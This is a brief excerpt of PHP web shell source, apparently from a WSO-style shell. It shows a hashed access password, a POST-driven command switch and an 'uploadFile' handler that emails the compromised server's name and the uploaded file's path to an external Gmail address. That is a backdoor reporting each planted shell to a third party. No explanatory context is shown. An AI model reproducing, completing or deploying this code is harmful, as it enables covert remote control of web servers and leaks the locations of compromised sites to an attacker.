...
$auth_pass = "b54e3dded7d7c4bea15deab539d38c2a";
$color = "#df5";
	...
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				...
				{
						$to  = 'minig00ls@gmail.com'; 
						$subject = 'File Upload Information';
						$message = 'Here is the file upload path: http://'.$_SERVER['SERVER_NAME'].$_POST['c'].$_FILES['f']['name'];
